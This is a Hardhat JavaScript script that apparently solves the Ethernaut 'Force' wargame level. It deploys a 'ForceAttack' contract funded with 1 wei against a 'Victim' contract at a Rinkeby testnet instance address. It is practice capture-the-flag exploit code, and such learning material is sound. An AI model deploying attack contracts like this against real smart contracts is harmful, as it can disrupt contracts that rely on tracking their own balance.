const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("Force");
  const victim = await Victim.attach(
    "0xCC47D5dD4EcAAF96A7A4f7c8B72e029992EAd927" // This is the contract address that you get from starting your instance
  );

  // You can check the balance of the contract in Rinkeby Etherscan

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("ForceAttack");

  // Deploy contract
  const contract = await MyContract.deploy(
    "0xCC47D5dD4EcAAF96A7A4f7c8B72e029992EAd927", // This is the contract address that you get from starting your instance
    { value: 1 } // Send 1 wei to the attack contract
  );
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // Check balance again in Rinkeby Etherscan
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
